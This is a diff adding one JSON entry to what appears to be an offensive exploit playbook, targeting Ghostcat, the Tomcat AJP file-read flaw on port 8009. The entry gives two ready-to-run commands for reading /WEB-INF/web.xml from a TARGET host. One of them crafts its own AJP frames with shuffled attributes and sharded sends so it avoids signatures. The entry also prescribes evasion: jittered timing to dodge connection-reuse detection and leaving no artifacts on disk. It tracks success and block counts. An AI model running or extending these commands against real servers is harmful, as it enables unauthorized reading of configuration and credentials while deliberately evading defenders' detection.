@@ -1,0 +1,33 @@
+{
+  "id": "w001",
+  "name": "Tomcat AJP 文件读取 (Ghostcat)",
+  "family": "exploit/tomcat",
+  "match": {"product": "tomcat", "version": "<9.0.31", "port": "8009"},
+  "variants": [
+    {
+      "vid": "v1",
+      "desc": "ajpShooter 原始请求",
+      "command": "python3 ajpShooter.py http://TARGET:8080 8009 /WEB-INF/web.xml read",
+      "sig": ["ajpShooter", "AJP13", "javax.servlet.include"],
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v2",
+      "desc": "自组 AJP 帧，属性顺序打散，分片发送",
+      "command": "python3 -c \"from ajp_frame import read_file; read_file('TARGET', 8009, '/WEB-INF/web.xml', shard=512)\"",
+      "sig": [],
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    }
+  ],
+  "evasion": {
+    "traffic": "请求间隔 300–800ms 抖动，避免 AJP 连接复用检测",
+    "artifact": "只读不写，不落地"
+  },
+  "notes": "先确认 8009 可达且 Tomcat < 9.0.31；v2 需要自备 ajp_frame 脚本。",
+  "created_at": "2026-11-15T00:00:00Z",
+  "updated_at": "2026-11-15T00:00:00Z"
+}
